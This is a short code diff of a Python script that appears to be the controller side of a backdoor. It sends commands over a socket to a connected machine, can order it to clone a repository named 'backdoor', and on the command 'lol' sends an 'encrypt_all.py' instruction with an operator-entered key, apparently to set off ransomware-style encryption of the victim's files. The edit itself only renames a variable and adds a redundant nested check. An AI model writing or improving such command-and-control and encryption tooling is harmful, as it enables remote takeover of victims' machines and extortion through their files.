@@ -58,12 +58,13 @@ while True:
         # if git_clone command was issued, send the repo name
         repo_name = "https://github.com/emomeza/backdoor"
         send_git_clone_command(client_socket, repo_name)
-        
+
     if command.lower() == "lol":
-        command = "python3 encrypt_all.py"
-        input = input("Enter the key: ")
-        client_socket.send(command.encode())
-        client_socket.send(input.encode())
+        if command.lower() == "lol":
+            command = "lol encrypt_all.py"
+            input_str = input("Enter the key: ")  # changed 'input' to 'input_str'
+            client_socket.send(command.encode())
+            client_socket.send(input_str.encode())  # changed 'input' to 'input_str'
     # retrieve command results
     output = client_socket.recv(BUFFER_SIZE).decode()
     # split command output and current directory
